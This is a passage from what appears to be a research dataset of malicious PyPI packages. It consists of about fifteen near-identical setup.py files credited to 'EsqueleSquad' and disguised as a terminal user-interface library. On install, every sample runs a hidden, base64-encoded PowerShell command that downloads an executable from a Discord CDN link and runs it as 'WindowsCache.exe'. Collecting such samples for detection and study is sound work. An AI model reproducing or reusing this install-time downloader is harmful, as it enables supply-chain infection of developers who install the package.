Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tppingvercv-v1.94",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppingvercv',\n    packages = ['modlib'],\n    version = '9.81',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tppullpyad-v4.70",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppullpyad',\n    packages = ['modlib'],\n    version = '6.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tppushmaskpull-v4.22",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppushmaskpull',\n    packages = ['modlib'],\n    version = '8.96',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tppyhttprand-v6.97",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppyhttprand',\n    packages = ['modlib'],\n    version = '1.69',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tppyintgame-v3.66",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppyintgame',\n    packages = ['modlib'],\n    version = '3.8',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpramosintpost-v6.36",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpramosintpost',\n    packages = ['modlib'],\n    version = '5.28',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpramtoolpong-v10.48",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpramtoolpong',\n    packages = ['modlib'],\n    version = '1.35',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tprandpushvirtual-v4.50",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tprandpushvirtual',\n    packages = ['modlib'],\n    version = '10.34',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tprandrehttp-v8.84",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tprandrehttp',\n    packages = ['modlib'],\n    version = '6.31',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpreurlultra-v5.84",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpreurlultra',\n    packages = ['modlib'],\n    version = '10.40',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpstringhackedstudy-v6.3",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpstringhackedstudy',\n    packages = ['modlib'],\n    version = '6.26',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpstringintpong-v8.96",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpstringintpong',\n    packages = ['modlib'],\n    version = '10.67',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpstrintelurl-v8.74",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpstrintelurl',\n    packages = ['modlib'],\n    version = '2.11',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpstrlibhydra-v1.64",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpstrlibhydra',\n    packages = ['modlib'],\n    version = '3.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language 